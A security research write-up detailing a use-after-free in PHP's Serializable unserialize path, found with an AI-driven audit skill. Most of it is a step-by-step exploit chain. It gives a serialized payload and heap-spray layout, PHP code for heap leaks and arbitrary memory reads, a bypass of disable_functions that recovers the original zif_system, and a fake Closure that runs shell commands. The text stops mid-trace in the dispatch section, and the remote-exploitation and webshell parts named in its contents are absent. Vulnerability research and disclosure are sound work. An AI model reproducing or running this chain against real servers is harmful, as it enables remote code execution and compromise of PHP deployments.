# PHP 8.x Serializable var_hash UAF: Local and Remote Exploitation

## Part I: Local Exploitation

- [Discovery](#discovery)
- [The Vulnerability](#the-vulnerability)
- [Triggering the UAF](#triggering-the-uaf)
- [Heap Spray and Reclamation](#heap-spray-and-reclamation)
- [Phase 1: Heap Address Leak via R: Write-Through](#phase-1-heap-address-leak-via-r-write-through)
- [Phase 2: The Mega-String and Object Pointer Discovery](#phase-2-the-mega-string-and-object-pointer-discovery)
- [Phase 3: Finding function_table via .bss Scan](#phase-3-finding-function_table-via-bss-scan)
- [Phase 4: Finding symbol_table](#phase-4-finding-symbol_table)
- [Phase 5: Finding zif_system via Module Function Entry Table](#phase-5-finding-zif_system-via-module-function-entry-table)
- [Phase 6: Building a Fake Closure and Code Execution](#phase-6-building-a-fake-closure-and-code-execution)
- [Full Chain (Local)](#full-chain-local)

## Part II: Remote Exploitation

- [Docker Lab Setup](#docker-lab-setup)
- [Remote Exploitation Overview](#remote-exploitation-overview)
- [Attack Surface and Threat Model](#attack-surface-and-threat-model)
- [IS_STRING Arbitrary Read Primitive](#is_string-arbitrary-read-primitive)
- [Remote Phase 1: Heap Leak](#remote-phase-1-heap-leak)
- [Remote Phase 2: ELF Header Scan](#remote-phase-2-elf-header-scan)
- [Remote Phase 3: Dynamic Symbol Resolution](#remote-phase-3-dynamic-symbol-resolution)
- [Remote Phase 3.5: libc Discovery via libphp GOT](#remote-phase-35-libc-discovery-via-libphp-got)
- [Remote Phase 4–5: EG Globals and function_table Lookup](#remote-phase-4-5-eg-globals-and-function_table-lookup)
- [Remote Phase 6–7: Handler Resolution and libc system()](#remote-phase-6-7-handler-resolution-and-libc-system)
- [Remote Phase 8: Spray Slot Discovery via ZMM Chunk Metadata](#remote-phase-8-spray-slot-discovery-via-zmm-chunk-metadata)
- [Remote Phase 9: IS_OBJECT RCE Trigger](#remote-phase-9-is_object-rce-trigger)
- [The GC_ADDREF Corruption Problem](#the-gc_addref-corruption-problem)
- [Webshell Deployment and Interactive Access](#webshell-deployment-and-interactive-access)
- [Full Chain (Remote)](#full-chain-remote)
- [Exploit Output](#exploit-output)

## Part III: Analysis

- [Reliability](#reliability)
- [Affected Versions](#affected-versions)
- [Primitives Reference](#primitives-reference)
- [Appendix: User Prompts](#appendix-user-prompts)

# Discovery

This vulnerability was found using an automated unserialize surface audit driven by Claude Code's [`/php-unserialize-audit`](https://github.com/califio/skills) skill, a multi-agent audit framework that systematically hunts for exploitable memory-safety bugs in PHP's deserialization surface.

## The Audit Skill

The `/php-unserialize-audit` skill implements a structured 5-step audit pipeline:

1. **Target discovery (D1–D10):** Ten automated grep/ripgrep queries enumerate the attack surface across the entire PHP source tree, custom `ce->unserialize` handlers, magic method implementations, session decoders, `php_var_unserialize` callers outside the core deserializer, type-confusion-prone `Z_*_P` accesses, signed-length memcpy/erealloc pairs, and `Serializable` interface implementers. No hardcoded file list, the surface is defined by code patterns.

2. **Context gathering:** Before delegating, the orchestrating agent reads the target PHP version's `zend_types.h` (zval/HashTable/Bucket layout), `var_unserializer.re` (var_hash registration rules, `R:`/`r:` resolution semantics, `var_push_dtor` vs `var_push_dtor_no_addref`), and magic method dispatch sites. This produces a `SHARED_CONTEXT` block containing the structural invariants that determine whether a candidate is a real bug.

3. **Parallel agent sweep:** One sonnet agent per file (or small related-file group) hunts for 12 bug classes (U1–U12) derived from the phpcodz advisory corpus, custom unserializer UAFs, magic-method-freeing-mid-deserialize, `convert_to_*` implicit destruction, `Serializable` reentrancy, session decoder inter-iteration UAFs, type confusion, signed-length heap overflows, partial-object `__destruct`, and parse inconsistencies. Each agent must name the exact line where the bad thing happens or the finding is rejected.

4. **Opus verification:** HIGH/MEDIUM findings are verified by a separate opus agent that constructs the serialized trigger string and traces the refcount lifecycle from allocation to free to re-use.

5. **Synthesis:** Results are presented as a severity-ranked table, cross-referenced against the phpcodz advisory corpus to distinguish rediscoveries from new bugs.

The skill encodes a bug taxonomy (U1–U12) extracted from ~20 historical PHP deserialization advisories (pch-010 through pch-034), including Taoguang Chen's 2015-era SPL UAFs (CVE-2015-6834), SoapFault type confusions, and session decoder UAFs. Each class has specific verification requirements, an agent can't report a U1 (custom unserializer UAF) without identifying the exact `php_var_unserialize` registration line, the exact `zval_ptr_dtor` free line, and the `R:N` offset that resolves to the freed slot.

## The Initial Audit

The vulnerability was discovered during a broad audit of PHP 5.6.40's unserialize surface:

```
/php-unserialize-audit all
```

Seven parallel sonnet agents covered the full D1–D10 discovery union, `var_unserializer.re`, all SPL classes, `ext/date`, `ext/gmp`, `ext/soap`, `Zend/zend_exceptions.c`, `ext/phar`, `ext/session`, `ext/wddx`, `ext/sysvmsg`, `ext/sysvshm`, and `ext/pdo`. The audit successfully rediscovered all 12 historical phpcodz advisories (pch-019 through pch-034) and confirmed their fixes in 5.6.40, validating the methodology.

Among the new findings, the audit flagged **M5, `C:` Serializable reentrancy shares outer var_hash** (U5 class):

> **File:** `ext/standard/var_unserializer.re:421-444`
> **U-class:** U5
>
> When top-level `PHP_FUNCTION(unserialize)` is active with `serialize_lock==0, level==1` and `Serializable::unserialize()` is dispatched inside a `C:` payload, and that PHP method calls `unserialize()` recursively, the inner `PHP_VAR_UNSERIALIZE_INIT` takes the reuse branch (increments level, shares the outer `var_hash`). Inner-stream objects land in the SHARED outer dtor list and can be referenced by outer `R:N` / `r:N` in subsequent outer bytes.

The audit rated this MEDIUM because "no independently exploitable primitive without a pathological user class", the stock SPL `Serializable` implementations (`ArrayObject`, `SplObjectStorage`, `SplDoublyLinkedList`) share the outer var_hash (verified experimentally), but none of their C unserialize handlers trigger `zend_hash_do_resize` on an HT whose arData is in the shared var_entries.

## From Audit Finding to Exploit

The M5 finding identified the structural precondition, shared var_hash across `Serializable::unserialize()` reentrancy, but left the exploitation question open. The key insight that turned it into a weaponizable primitive was constructing a **gadget class** whose `unserialize()` method:

1. Calls `unserialize()` recursively on attacker-controlled inner data (registering inner-object property slots in the shared var_hash)
2. Then adds at least one dynamic property to the inner-parsed object (triggering `zend_hash_do_resize`, which `efree`s the old arData while the outer var_hash still references it)

The `CachedData` class in this exploit collapses to one statement: `unserialize($data)->x = 0;`. The attacker crafts the inner payload as `O:8:"stdClass":8:{...}` so the property HT is allocated at `nTableSize=8` and immediately filled to capacity by the inner parse; the gadget's single `->x = 0` write is the 9th insert, forcing the 8→16 resize and freeing the old arData. The stale `R:4` reference (slot 4 = the first inner property zval) in the outer stream then reads from freed memory.

The root cause, `zend_user_unserialize` not incrementing `BG(serialize_lock)`, was then confirmed to be present in every PHP version from 5.1 through 8.5.5. The code in `Zend/zend_interfaces.c:442-460` has never been patched. This is essentially **pch-030 surviving into modern PHP**: the 2015-era fix tightened individual SPL call sites but never addressed the root cause in the Serializable dispatch path.

## ASAN Confirmation

The bug was confirmed with AddressSanitizer on PHP 8.5.5:

```
==ERROR: AddressSanitizer: heap-use-after-free on address 0x512000020008
READ of size 1 at 0x512000020008 thread T0
  #1 php_var_unserialize_internal  var_unserializer.c:1230  ← outer R:4 handler
  #2 process_nested_array_data     var_unserializer.c:506

freed by thread T0 here:
  #3 zend_hash_do_resize           zend_hash.c:1327         ← stdClass arData efree
  #13 zend_user_unserialize        zend_interfaces.c:451    ← missing BG(serialize_lock)++

previously allocated by thread T0 here:
  #7 object_common                 var_unserializer.c:823   ← inner O:8:"stdClass" properties
```

The allocate → free → use chain spans three distinct subsystems (core deserializer → user-code dispatch → HashTable allocator), which is what allowed the bug to survive every narrower review for a decade.

# The Vulnerability

`zend_user_unserialize()` (`Zend/zend_interfaces.c:442`) dispatches the PHP-level `Serializable::unserialize()` method without incrementing `BG(serialize_lock)`. When the PHP method body calls `unserialize()` recursively, the inner parse **shares the outer var_hash**. Property values registered during inner parsing become stale when the containing object's property hash table is resized, the engine calls `zend_hash_do_resize` which `efree`s the old `arData`. The outer parser's `R:N` references still index into the freed allocation.

```c
// Zend/zend_interfaces.c:442-460 - NO serialize_lock increment
ZEND_API int zend_user_unserialize(zval *object, zend_class_entry *ce,
                                   const unsigned char *buf, size_t buf_len,
                                   zend_unserialize_data *data)
{
    zval zdata;
    ZVAL_STRINGL(&zdata, (char*)buf, buf_len);
    // BG(serialize_lock)++ is MISSING here
    zend_call_method_with_1_params(           // user PHP code runs
        Z_OBJ_P(object), Z_OBJCE_P(object),  // without the lock
        NULL, "unserialize", NULL, &zdata);
    zval_ptr_dtor(&zdata);
    ...
}
```

Every other user-code dispatch site during unserialize (`__wakeup`, `__unserialize`) increments the lock. This path was overlooked, likely because the `Serializable` interface is deprecated and was assumed to be a dead code path.

**Affected versions:** PHP 5.1+ through 8.5.x (all versions with the `Serializable` interface). See [Affected Versions](#affected-versions) for full details.

# Triggering the UAF

The exploit uses a `Serializable` class whose `unserialize()` method calls the built-in `unserialize()` on its input, then writes one property to the deserialized object:

```php
class CachedData implements Serializable {
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void {
        unserialize($data)->x = 0;
    }
}
```

The attacker's inner payload is `O:8:"stdClass":8:{...}` (8 inner properties). The unserializer creates the property HT with `nTableSize=8`, fills it to capacity during the inner parse, and the gadget body's single `->x = 0` write is the 9th insert. PHP calls `zend_hash_do_resize`, the table grows from `nTableSize=8` to `nTableSize=16` (320→640 bytes), and the original 320-byte arData (in ZendMM **bin-320**) is `efree`d. The `var_hash` entries for the 8 inner properties (`p0`–`p7`) still point into the freed bin-320 memory.

## var_hash Slot Mapping

The shared var_hash assigns sequential slot numbers to each value parsed during both inner and outer `unserialize()`. String/integer keys are NOT registered, only values:

```
Slot  Value                       Notes
────  ──────────────────────────  ──────────────────────────────
R:1   outer array                 a:N:{...}
R:2   CachedData object           C:10:"CachedData":...
      ─── inner unserialize (shared var_hash) ───
R:3   stdClass object             O:8:"stdClass":8:{...}
R:4   p0 value (IS_LONG)          ← STALE after arData resize
R:5   p1 value                    ← STALE
...                               ...
R:11  p7 value                    ← STALE
```

The 8 properties land at Bucket[0] through Bucket[7] in the arData (insertion-ordered: p0 is the first property inserted, so p0 occupies bucket[0]). This was verified empirically by placing unique markers at each bucket position and checking which `R:N` reads which marker:

```
R:4   → Bucket[0]  (p0)
R:5   → Bucket[1]  (p1)
...
R:11  → Bucket[7]  (p7)
```

# Heap Spray and Reclamation

The freed arData was 320 bytes in ZendMM bin-320 (the allocator bin for 257–320 byte allocations). With `nTableSize=8`, `HT_SIZE_TO_MASK(n) = -(n+n)` makes the hash-index region 16 × uint32 = 64 bytes, followed by 8 × 32-byte buckets = 256 bytes, totaling exactly 320 bytes. To reclaim this memory, we spray 32 strings of content length 280 bytes. A `zend_string` of 280 content bytes requires `24 (header) + 280 (content) + 1 (NUL) = 305 bytes` of allocation, also bin-320.

The payload structure:

```
a:34:{
  i:0; C:10:"CachedData":LEN:{
    O:8:"stdClass":8:{
      s:2:"p0";i:0xAAAA0000;   ← var_hash R:4 → Bucket[0]
      s:2:"p1";i:0xAAAA0001;   ← R:5 → Bucket[1]
      ...
      s:2:"p7";i:0xAAAA0007;   ← R:11 → Bucket[7]
    }
  }
  i:1;  s:280:"<spray content>"; ← 32 spray strings, all bin-320
  i:2;  s:280:"<spray content>";
  ...
  i:32; s:280:"<spray content>";
  i:33; R:4;                     ← stale reference into freed arData
}
```

After `CachedData::unserialize()` frees the old arData and returns, the outer parser continues allocating the 32 spray strings. One of them reclaims the freed bin-320 slot. The stale `R:4` reference then reads from spray-controlled memory.

## Spray Content Layout

The spray strings are crafted so that each Bucket position in the reclaimed arData contains a valid zval. The freed arData layout, mapped into spray string content offsets:

```
arData allocation (320 bytes, bin-320):
  [0x00..0x3F]:  hash indices (16 x uint32, HT_SIZE_TO_MASK doubles the count)
  [0x40..0x5F]:  Bucket[0] = {zval(16B), h(8B), key*(8B)}  ← R:4 reads from here
  [0x60..0x7F]:  Bucket[1]  ← R:5
  [0x80..0x9F]:  Bucket[2]  ← R:6
  ...

zend_string content starts at allocation offset 0x18 (after header).
So Bucket[k] zval starts at content offset: (0x40 + k*32) - 0x18 = 0x28 + k*32
  Bucket[0] at 0x28, Bucket[1] at 0x48, Bucket[2] at 0x68, ..., Bucket[7] at 0x108.
```

For the heap leak phase, all buckets contain `IS_LONG` (type_info=4) with unique markers. For the read/execute phases, Bucket[0] contains a type-confused zval (IS_STRING or IS_OBJECT) while all other buckets remain IS_LONG for GC safety.

# Phase 1: Heap Address Leak via R: Write-Through

When the outer parser processes `R:4`, it calls `var_access` which returns the stale pointer, then `ZVAL_MAKE_REF` which:

1. Reads the zval at the stale location (now spray content)
2. Allocates a new `zend_reference` struct (24 bytes, bin-32)
3. **Writes** the reference pointer and IS_REFERENCE type_info back into the stale location

This write-back modifies the spray string's content. By comparing each spray string against the original, we find which string reclaimed the freed arData and extract the `zend_reference` heap pointer:

```php
$spray = build_spray_islong();
$original = $spray;
$payload = build_payload($spray, 8);    // 8 stale refs: R:4..R:11
$result = @unserialize($payload);

for ($i = 1; $i <= 32; $i++) {
    $s = $result[$i];
    for ($k = 0; $k < 8; $k++) {
        $vo = 0x28 + $k * 0x20;        // Bucket[0..7] value offset
        if (substr($s, $vo, 8) !== substr($original, $vo, 8)) {
            $heap_addr = unpack('P', substr($s, $vo, 8))[1];
            // → 0x7dda8eaa2420 (zend_reference pointer)
        }
    }
}
```

The leaked address gives us the ZendMM chunk base: `chunk = heap_addr & ~0x1FFFFF` (chunks are 2MB-aligned).

# Phase 2: The Mega-String and Object Pointer Discovery

This is the key phase that eliminates all `/proc` dependencies and all hardcoded symbol offsets. We need to find the PHP binary's `closure_handlers` and `zend_ce_closure` addresses using only heap-based primitives, without knowing any binary symbol offsets.

## The Mega-String: One UAF Trigger, 2MB Read Window

ZendMM organizes memory into 2MB chunks. The chunk header at offset `+0x00` contains a pointer to the heap struct:

```
zend_mm_chunk:
  +0x00: zend_mm_heap *heap    ← always non-zero (= chunk + 0x40)
  +0x08: zend_mm_chunk *next
  +0x10: zend_mm_chunk *prev
  ...
```

We create a fake `zend_string` at `chunk - 0x10`. This places the `len` field at `chunk + 0x00`, which is the heap pointer, a huge non-zero value (~0x7xxx00000040). The `val` array starts at `chunk + 0x08`:

```
Fake zend_string at (chunk - 0x10):
  +0x00: gc.refcount      = *(chunk - 0x10)  ← unmapped, but never accessed
  +0x08: h                = *(chunk - 0x08)  ← never accessed
  +0x10: len              = *(chunk + 0x00)  = heap pointer (HUGE)
  +0x18: val[0]           = *(chunk + 0x08)  = chunk->next

strlen() returns the heap pointer (~140TB).
$str[N] reads byte at chunk + 0x08 + N.
Safe range: 0 to 0x1FFFF8 (entire 2MB chunk).
```

The `gc` and `h` fields are at `chunk - 0x10` and `chunk - 0x08`, which may be unmapped memory, but the engine **never accesses** these fields for a non-refcounted string (`type_info=6`). `strlen()` reads only `ZSTR_LEN`. `$str[$i]` reads only from `ZSTR_VAL + $i`.

## Closure Spray and zend_object Pattern Matching

Before creating the mega-string, we spray 256 `Closure` objects into the heap:

```php
for ($i = 0; $i < 256; $i++) {
    $GLOBALS["_spray_$i"] = function(){};
}
```

These Closures are allocated via `emalloc` into the same ZendMM chunk. Each `zend_object` has a fixed layout:

```
zend_object:
  +0x00: gc.refcount     (uint32)  = 1
  +0x04: gc.type_info    (uint32)  = IS_OBJECT (low nibble = 8)
  +0x08: handle          (uint32)  = 1..N (object store index)
  +0x0C: [padding]       (uint32)  = 0
  +0x10: ce              (uint64)  = zend_class_entry* (system malloc addr)
  +0x18: handlers        (uint64)  = zend_object_handlers* (.bss addr)
```

We scan the 2MB mega-string at 16-byte-aligned offsets for this gc pattern:

```php
for ($off = 8; $off + 32 <= $max_off; $off += 16) {
    $rc = unpack('V', substr($str, $off, 4))[1];
    if ($rc < 1 || $rc > 50) continue;              // refcount 1-50
    $ti = ord($str[$off + 4]) & 0x0F;
    if ($ti != 8) continue;                          // IS_OBJECT
    $handle = unpack('V', substr($str, $off + 8, 4))[1];
    if ($handle == 0 || $handle > 100000) continue;  // valid handle
    $pad = unpack('V', substr($str, $off + 12, 4))[1];
    if ($pad != 0) continue;                         // padding = 0
    $ce = unpack('P', substr($str, $off + 16, 8))[1];
    $handlers = unpack('P', substr($str, $off + 24, 8))[1];
    // ... filter and group by handlers address
}
```

Filtering removes heap pointers (those in the same chunk) and groups candidates by `handlers` value. The most common `handlers` value, matching all 256+ sprayed Closures, identifies `closure_handlers` and `zend_ce_closure`:

```
[+] Found 3 object groups, best: count=257 ce=0x55c1048bb460 handlers=0x55c103c17a20
```

The `ce` pointer (to the class entry struct) is in the brk heap (allocated via system `malloc` for persistent internal classes). The `handlers` pointer is a static variable in the binary's `.bss` segment. Both are discovered without any hardcoded offsets.

# Phase 3: Finding function_table via .bss Scan

With `closure_handlers` known (a `.bss` address), we can locate `executor_globals` (EG), also in `.bss`, typically within a few hundred bytes.

## The EG Layout

EG contains, among other fields:

```
executor_globals:
  +0x130: symbol_table     (embedded HashTable - 56 bytes)
  ...
  +0x1b0: function_table   (HashTable* - pointer, PHP 8.0-8.4)
  +0x1b8: class_table      (HashTable* - pointer)
  +0x1c0: zend_constants   (HashTable* - pointer)

  - or for PHP 8.5+ (new fields shift offsets): -

  +0x1c8: function_table   (HashTable*)
  +0x1d0: class_table      (HashTable*)
  +0x1d8: zend_constants   (HashTable*)
```

The key insight: `function_table`, `class_table`, and `zend_constants` are three **consecutive pointer-sized fields** pointing to persistent HashTables allocated via system `malloc`. All three pointers are in a similar address range (same allocator region).

## Scanning for the Triple-Pointer Pattern

We scan from `handlers + 0x20` to `handlers + 0x300` in 8-byte steps, trying both `ft_off=0x1b0` and `ft_off=0x1c8`:

```php
for ($delta = 0x20; $delta < 0x300; $delta += 8) {
    foreach ([0x1b0, 0x1c8] as $ft_off) {
        $ptr_addr = $handlers + $delta + $ft_off;
        $d = uaf_read($ptr_addr, 24);    // read 3 consecutive pointers
        $ft_ptr = unpack('P', substr($d, 0, 8))[1];
        $ct_ptr = unpack('P', substr($d, 8, 8))[1];
        $zc_ptr = unpack('P', substr($d, 16, 8))[1];
        // All 3 must be valid pointers in similar range
        if (abs($ft_ptr - $ct_ptr) > 0x1000000) continue;
        if (abs($ct_ptr - $zc_ptr) > 0x1000000) continue;
        // Dereference ft_ptr and validate the HashTable struct
        ...
    }
}
```

After finding a candidate `function_table` pointer, we dereference it and validate the HashTable:

```
function_table (HashTable, in system malloc heap):
  +0x0C: nTableMask     (uint32)  - must be negative power of 2
  +0x10: arData         (Bucket*) - must be a valid pointer
  +0x18: nNumUsed       (uint32)  - must be 100-10000 (built-in functions)
```

The `nTableMask` check (`(~mask + 1)` is a power of 2, >= 64) eliminates virtually all false positives.

## Per-Read UAF Primitive

Each `uaf_read` call creates a fresh IS_STRING type confusion to read memory at an arbitrary address:

```php
function uaf_read($addr, $n = 8) {
    foreach ([0, 0x08, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200] as $bias) {
        $target = $addr - 0x18 - $bias;
        // spray IS_STRING at Bucket[0] pointing to $target as fake zend_string
        // R:4 reads the fake IS_STRING → $str = fake string
        // $str[$bias .. $bias+n-1] = bytes at $addr
    }
}
```

The bias parameter shifts the fake `zend_string` base so that the `len` field overlaps with different memory. If `len` is zero for one bias, another bias value overlaps with non-zero data. Eight bias values cover a 512-byte window, providing high read success rates for most mapped addresses.

# Phase 4: Finding symbol_table

The `delta + ft_off` combination from Phase 3 has an inherent ambiguity: `delta=0xc8, ft_off=0x1c8` and `delta=0xe0, ft_off=0x1b0` both produce the same combined offset `0x290`. To resolve this, we try both decompositions and validate the `symbol_table` HashTable at `EG + 0x130`:

```php
foreach ([0x1b0, 0x1c8] as $ft_off) {
    $delta = $combined - $ft_off;
    $eg = $handlers + $delta;
    $st = $eg + 0x130;           // symbol_table is always at EG+0x130
    // Read and validate: nTableMask, arData, nNumUsed (should be < 500)
}
```

`symbol_table` is an **embedded** HashTable (not a pointer), the struct lives directly inside EG at offset `+0x130`. Its `nNumUsed` is small (typically < 300 global variables), distinguishing it from `function_table` (700+ entries).

# Phase 5: Finding zif_system via Module Function Entry Table

The exploit needs the address of `zif_system`, the C function that implements PHP's `system()`. Rather than reading it from `function_table` (where `disable_functions` may have replaced it with a disabled stub), the exploit reads the **original** handler from the standard module's static function entry array, which is never modified at runtime.

## How disable_functions Works (and Why It Doesn't Help)

When `system` appears in the `disable_functions` INI directive, `zend_disable_function()` replaces the handler at `+0x58` in the **heap-allocated** `zend_internal_function` (inside `function_table`) with `zend_display_disabled_function`. But the **source** `zend_function_entry[]` array in the module's `.data.rel.ro` section, the compile-time table from which `function_table` was populated at startup, is untouched.

`zend_register_functions()` copies entries from the module's static array into heap-allocated `zend_internal_function` structs and inserts them into `function_table`. `zend_disable_function()` patches the **copies**. The source array retains the original `zif_system` pointer.

## Discovery Chain

The exploit finds the original `zif_system` handler through three reads:

1. **Find the standard module**, look up a non-disabled function known to be in `ext/standard` (e.g. `var_dump`) in `function_table` via DJBX33A hash. Read its `zend_internal_function.module` pointer at `+0x60`. This points to the `zend_module_entry` for the "standard" extension. Validate by reading the module name at `+0x20`, it should be "standard".

2. **Read the module's function list**, the `zend_module_entry` has a `functions` pointer at `+0x28`, pointing to the static `zend_function_entry[]` array.

3. **Walk entries for "system"**, each `zend_function_entry` is 0x30 bytes (PHP 8.4+). The `fname` pointer is at `+0x00` and the **original handler** is at `+0x08`. Walk entries until the name matches "system".

```php
// Step 1: Find standard module via a non-disabled function
$bucket = $this->ht_find_raw($arData, $nTableMask, "var_dump");
$func_ptr = unpack('P', substr($bucket, 0, 8))[1];
$mod_ptr = $this->read8($func_ptr + 0x60);   // zend_internal_function.module

// Step 2: Read module's function list
$funcs = $this->read8($mod_ptr + 0x28);       // zend_module_entry.functions

// Step 3: Walk zend_function_entry[] for "system"
for ($j = 0; $j < 600; $j++) {
    $entry = $funcs + $j * 0x30;
    $fname_ptr = $this->read8($entry);
    if ($fname_ptr == 0) break;                // end of array sentinel
    $fname = $this->read_str($fname_ptr, 16);
    if ($fname === 'system')
        return $this->read8($entry + 0x08);    // original zif_system
}
```

```
var_dump in function_table (DJBX33A hash lookup)
  → zend_internal_function+0x60 = module → zend_module_entry (standard)
    → module+0x28 = functions → zend_function_entry[]
      → entry[286].fname = "system"
      → entry[286].handler = zif_system (original, not the disabled stub)
```


## Implementation Details

The DJBX33A hash lookup (used to find `var_dump` in `function_table`) follows the Zend hash table algorithm: compute hash with bit 63 set, index into the hash slots via `nTableMask`, walk the bucket chain comparing key strings. This is the same mechanism used for `symbol_table` lookups when locating the fake closure. The bit-63 convention (`hash | 0x8000000000000000`) is critical, without it, hash bytes won't match the Bucket `h` fields.

The module pointer at `zend_internal_function+0x60` is validated by reading the name string at `module+0x20` and checking it equals "standard". The API version at `+0x04` should be 20250925 (PHP 8.5) but is not checked, reading the first 8 bytes of the module entry sometimes fails due to alignment constraints of the IS_STRING read primitive.

The `zend_function_entry` size of 0x30 bytes was determined empirically: reading the first two entries' `fname` pointers at offsets 0x00 and 0x30 both resolve to valid function names ("set_time_limit" and "header_register_callback"). Offsets 0x20 and 0x28 resolve to NULL or non-pointer values, confirming 0x30 as the entry stride. The standard module has ~500 function entries; "system" is at entry 286.

# Phase 6: Building a Fake Closure and Code Execution

This phase exploits the stale var_hash reference one final time, not to read memory, but to make the engine treat attacker-controlled data as a live PHP object. The engine's `unserialize()` resolves `R:4` through the stale pointer, reads a zval from reclaimed spray content, and, because we control the type and value fields, treats it as a `zend_object*` pointing to our fake Closure.

## The Type Confusion Mechanism

A zval in PHP 8.x is 16 bytes:

```
zval (16 bytes):
  +0x00: value    (8 bytes) - union: long, double, pointer (zend_string*, zend_object*, ...)
  +0x08: u1       (4 bytes) - type_info: bits 0-7 = type, bits 8-15 = type flags
  +0x0C: u2       (4 bytes) - various (next index for HT, etc.)
```

The type field at `+0x08` determines how the engine interprets the 8-byte value:

| type_info | Type | Value interpretation |
|-----------|------|---------------------|
| `0x04` | IS_LONG | Signed 64-bit integer |
| `0x06` | IS_STRING | `zend_string*`, engine reads `len` at ptr+0x10, `val` at ptr+0x18 |
| `0x0308` | IS_OBJECT | `zend_object*`, engine reads `ce` at ptr+0x10, `handlers` at ptr+0x18 |

The exploit uses all three: IS_LONG for GC-safe padding (Phases 1–4), IS_STRING for arbitrary read (Phases 3–7), and IS_OBJECT for code execution (Phase 8).

When the outer `unserialize()` processes `R:4`, it calls `var_access()` which returns a pointer into the freed-and-reclaimed arData. The engine reads 16 bytes from that location as a zval. Because a spray string now occupies that memory, we control exactly what those 16 bytes contain.

### The Spray Layout for IS_OBJECT

Each spray string is 280 bytes of content, laid out to overlap with the original arData's Bucket array. The stale `R:4` reference reads from Bucket[0], which starts at content offset 0x28 (= 0x40 - 0x18, the difference between arData's bucket-array start and the spray's val[] start):

```
spray string content (280 bytes):
  offset 0x00..0x27:           covers freed hash-index region (zeros)
  offset 0x28: Bucket[0] - IS_OBJECT zval ← R:4 reads here
    [0x28..0x2F]: value = fake_closure_addr (8 bytes)
    [0x30..0x33]: type_info = 0x0308 (IS_OBJECT | IS_TYPE_REFCOUNTED | IS_TYPE_COLLECTABLE)
  offset 0x48: Bucket[1] - IS_LONG (0x04), GC-safe no-op
  offset 0x68: Bucket[2] - IS_LONG (0x04), GC-safe no-op
  ...
  offset 0xE8: Bucket[6] - IS_LONG (0x04), GC-safe no-op
  offset 0x108: Bucket[7] - IS_LONG (0x04), GC-safe no-op
```

The `0x0308` type_info breaks down as:
- `0x08`: IS_OBJECT (the type)
- `0x01 << 8`: IS_TYPE_REFCOUNTED, tells the engine this zval manages a refcounted object
- `0x02 << 8`: IS_TYPE_COLLECTABLE, the object participates in cycle collection

Both flags are required: without IS_TYPE_REFCOUNTED, `Z_OBJ_P()` would not dereference the pointer as a `zend_object*`. The engine now treats our 8-byte value as a pointer to a live object.

### Why Other Buckets Must Be IS_LONG

After `unserialize()` completes, `var_destroy()` iterates every entry in the var_hash and calls `zval_ptr_dtor()` on each. The stale entries R:4 through R:11 all point into spray content. If any bucket had IS_TYPE_REFCOUNTED set, `zval_ptr_dtor` would attempt `GC_DELREF` at the fake pointer address, decrementing a uint32 at an arbitrary location, causing a segfault or heap corruption.

IS_LONG (`type_info = 0x04`) has no flags set, so `zval_ptr_dtor` is a no-op. The IS_OBJECT bucket at Bucket[0] does have IS_TYPE_REFCOUNTED, but its value points to our fake object where `gc.refcount = 0x7FFFFFFF`, decrementing it still leaves a huge value, avoiding premature destruction.

## Fake zend_closure Layout

A real `zend_closure` embeds a `zend_object` header followed by a `zend_function` union:

```
zend_closure (PHP 8.x):
  +0x00: zend_object std {
    +0x00: gc.refcount     (uint32)
    +0x04: gc.type_info    (uint32)
    +0x08: handle          (uint32)
    +0x0C: [pad]           (uint32)
    +0x10: ce              (zend_class_entry*)
    +0x18: handlers        (zend_object_handlers*)
    +0x20: properties      (HashTable*)
    +0x28: properties_table (zval[])
  }
  +0x38: zend_function func {
    +0x00: type            (uint8)  - 1 = ZEND_INTERNAL_FUNCTION
    +0x01: arg_flags       (uint8[3])
    +0x04: fn_flags        (uint32)
    +0x08: function_name   (zend_string*)
    +0x10: scope           (zend_class_entry*)
    +0x18: prototype       (zend_function*)
    +0x20: num_args        (uint32)
    +0x24: required_num_args (uint32)
    +0x28: arg_info        (zend_internal_arg_info*)
    ...
    +0x58: handler         (zif_handler) - THE function pointer we control
    +0x60: module          (zend_module_entry*)
  }
  +0xA0: ...
```

The handler at `func+0x58` (= object+0x90) is the C function pointer that gets called when the closure is invoked. We set it to `zif_system`.

The exploit constructs this in a PHP string:

```php
$b = str_repeat("\x00", 512);

// zend_object header
$b[0x00..0x03] = 0x7FFFFFFF;      // gc.refcount - high value prevents collection
$b[0x04..0x07] = 0x00000018;      // gc.type_info: IS_OBJECT(8) | GC_NOT_COLLECTABLE(0x10)
$b[0x10..0x17] = zend_ce_closure;  // ce - must match real Closure class entry
$b[0x18..0x1F] = closure_handlers; // handlers - must match real Closure handlers vtable

// Embedded zend_function at +0x38
$b[0x38]       = 1;               // type = ZEND_INTERNAL_FUNCTION
$b[0x58..0x5B] = 1;               // num_args = 1
$b[0x5C..0x5F] = 1;               // required_num_args = 1

// The controlled function pointer
$b[0x90..0x97] = zif_system;      // handler = zif_system (from Phase 5)
```

The `ce` and `handlers` fields must be **real** Closure pointers, both come from Phase 2's heap scan. The engine validates `ce` when dispatching closures: `zend_get_closure_invoke_method()` checks `instanceof Closure` by comparing `ce` against `zend_ce_closure`. A wrong `ce` would fail the check and crash or take a non-closure dispatch path.

The `gc.type_info = 0x18` breaks down as `IS_OBJECT (0x08) | GC_NOT_COLLECTABLE (0x10)`. The GC_NOT_COLLECTABLE flag prevents the garbage collector from attempting to traverse or free this object during the next GC cycle.

## Locating the String's Address

The fake closure data lives inside a PHP string variable `$GLOBALS["_xfc"]`. We need its absolute memory address to put in the IS_OBJECT spray. The `EG.symbol_table` (found in Phase 4) maps variable names to zvals:

```
symbol_table → ht_find("_xfc")
  → Bucket.val = zend_string*
    → string + 0x18 = val[0] = start of fake zend_closure data
```

The symbol_table lookup uses the same DJBX33A hash mechanism as function_table lookups. The returned bucket contains a zval whose value is a `zend_string*`. If the variable is a reference (type IS_REFERENCE = 10), we dereference one level: read the inner zval at `zend_reference + 0x08`. The string content, our fake object data, starts at `zend_string + 0x18`.

## The Closure Dispatch Path (Zend VM)

When PHP code calls `$result[$idx]("id && uname -a")`, the Zend VM executes:

```
ZEND_INIT_DYNAMIC_CALL
  → zval type = IS_OBJECT
  → obj->ce == zend_ce_closure?  YES (our fake ce matches)
  → zend_get_closure_invoke_method(obj)
    → returns &closure->func (pointer to func at obj+0x38)
    → func.type == ZEND_INTERNAL_FUNCTION (= 1)

ZEND_DO_FCALL
  → handler = func->internal_function.handler (at func+0x58 = obj+0x90)
